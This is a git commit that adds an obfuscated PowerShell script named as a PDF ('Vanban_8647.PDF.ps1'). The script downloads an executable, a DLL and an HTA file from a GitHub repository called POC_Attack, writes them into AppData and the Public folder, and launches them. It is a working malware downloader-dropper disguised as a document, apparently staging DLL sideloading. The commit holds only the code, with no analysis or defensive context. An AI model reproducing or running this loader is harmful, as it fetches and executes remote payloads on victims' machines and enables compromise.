855a7d1dfb9ab6add4245bf178bdd4a7b2583b52
ppt0 <62158084+ppt0@users.noreply.github.com>
2024-07-23 14:26:37 +0200

    Add files via upload

---
+++ Vanban_8647.PDF.ps1
@@ -0,0 +1,28 @@
+$bnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ = $env:APPDATA + "\HPCustPartic";
+$34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ1 = 'https://raw.githubusercontent.com/ppt0/POC_Attack/main'+'/HP.exe'; $zWSDfHOA7Cseh0TeahWlLM61FOCBtQi0r3sciTreWeCj6OrM7Nth1 = $bnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ + '\HP.exe';
+$34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ2 = 'https://raw.githubusercontent.com/ppt0/POC_Attack/main' +'/HPCustPartUI.dll'; $zWSDfHOA7Cseh0TeahWlLM61FOCBtQi0r3sciTreWeCj6OrM7Nth2 = $bnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ + '\HPCustPartUI.dll'; 
+$34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ3 = 'https://raw.githubusercontent.com/ppt0/POC_Attack/main' +'/Vanban_8647.PDF.hta'; $zWSDfHOA7Cseh0TeahWlLM61FOCBtQi0r3sciTreWeCj6OrM7Nth3 ='C:\Users\Public\'+'Vanban_8647.PDF.hta';
+function b46HPyemfj8SpWI67xqpVvQdGTuAHfKDVVSiEVsltdnbX3A4YH($APZ, $WIj) {
+    [IO.File]::WriteAllBytes($APZ, $WIj)
+};
+function XwVVFfZL5BYp8L8BZyLn9chQ7mNZszEkfWnBmv80m8VPaPuw1v($APZ) {
+    start-process $APZ 
+};
+function a34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ($CLl) {
+    $UEm = New-Object Net.WebClient;
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12;
+    $WIj = $UEm.DownloadData($CLl);
+    return $WIj
+};
+function NGamWQy0sKK0cYZLADGSdDSr34KzKRtvwIJcDM5Nk2zif4vwg7() {
+    If (Test-Path -Path $bnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ) {
+	} Else { 
+		New-Item -ItemType Directory -Path $bnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ;
+	}
+	$r34KzKRtvwIJcDM5Nk2zif4vwg71 = a34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ($34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ1); b46HPyemfj8SpWI67xqpVvQdGTuAHfKDVVSiEVsltdnbX3A4YH $zWSDfHOA7Cseh0TeahWlLM61FOCBtQi0r3sciTreWeCj6OrM7Nth1 $r34KzKRtvwIJcDM5Nk2zif4vwg71;
+	$r34KzKRtvwIJcDM5Nk2zif4vwg72 = a34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ($34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ2); b46HPyemfj8SpWI67xqpVvQdGTuAHfKDVVSiEVsltdnbX3A4YH $zWSDfHOA7Cseh0TeahWlLM61FOCBtQi0r3sciTreWeCj6OrM7Nth2 $r34KzKRtvwIJcDM5Nk2zif4vwg72;
+	$r34KzKRtvwIJcDM5Nk2zif4vwg73 = a34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ($34RJ4HZdFqIXNTP7RL5pUPCbnQ1V9Cv5Rfuyl0yi0lAeIT9pWQ3); b46HPyemfj8SpWI67xqpVvQdGTuAHfKDVVSiEVsltdnbX3A4YH $zWSDfHOA7Cseh0TeahWlLM61FOCBtQi0r3sciTreWeCj6OrM7Nth3 $r34KzKRtvwIJcDM5Nk2zif4vwg73;
+	XwVVFfZL5BYp8L8BZyLn9chQ7mNZszEkfWnBmv80m8VPaPuw1v $zWSDfHOA7Cseh0TeahWlLM61FOCBtQi0r3sciTreWeCj6OrM7Nth3;
+	XwVVFfZL5BYp8L8BZyLn9chQ7mNZszEkfWnBmv80m8VPaPuw1v $zWSDfHOA7Cseh0TeahWlLM61FOCBtQi0r3sciTreWeCj6OrM7Nth1;
+}
+NGamWQy0sKK0cYZLADGSdDSr34KzKRtvwIJcDM5Nk2zif4vwg7;
